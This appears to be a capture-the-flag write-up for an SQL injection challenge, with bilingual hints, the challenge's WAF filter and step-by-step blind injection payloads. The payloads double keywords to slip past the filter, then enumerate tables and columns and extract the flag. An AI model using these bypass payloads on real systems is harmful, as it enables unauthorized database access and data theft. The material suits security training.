url:https://sqli.chal.h4ck3r.quest/

Skills: SQL injection / Information Leak

Hints:
You can leak the (almost full) source code from it's debug page, so just try to trigger some 500.
你其實可以從它的 debug 頁面中挖出（幾乎全部的）原始碼，所以該去試著戳出 500 了


https://sqli.chal.h4ck3r.quest






WAF:
str.gsub(/union|select|where|and|or| |=/i, '')



* example
select * from users where username="fjksdfjsd" or ascii(mid((SELECT column_name FROM information_schema.columns WHERE table_name LIKE 0x7573657273
 LIMIT 0,1),1,1)) > 0





* get table name

```
/**/oorr/**/ascii(mid((SESELECTLECT/**/table_name/**/FROM/**/infoorrmation_schema.tables/**/WHWHEREERE/**/table_schema/**/LIKE/**/database()/**/LIMIT/**/0,1),1,1))/**/>/**/0#
```

h3y_here_15_the_flag_y0u_w4nt,meow,flag

* get column count: 

```
/**/oorr/**/(SESELECTLECT/**/COUNT(column_name)/**/FROM/**/infoorrmation_schema.columns/**/WHWHEREERE/**/table_name/**/LIKE/**/0x6833795F686572655F31355F7468655F666C61675F7930755F77346E742C6D656F772C666C6167)/**/>/**/1#
```


* get column Name:

```
/**/oorr/**/ascii(mid((SESELECTLECT/**/column_name/**/FROM/**/infoorrmation_schema.columns/**/WHWHEREERE/**/table_schema/**/LIKE/**/database()/**/aandnd/**/table_name/**/LIKE/**/0x6833795F686572655F31355F7468655F666C61675F7930755F77346E742C6D656F772C666C6167/**/LIMIT/**/0,1),1,1))/**/>/**/0#
```

* get flag:

```
/**/oorr/**/ascii(mid((SESELECTLECT/**/i_4m_th3_fl4g/**/FROM/**/`h3y_here_15_the_flag_y0u_w4nt,meow,flag`/**/LIMIT/**/0,1),1,1))/**/>/**/0#
```






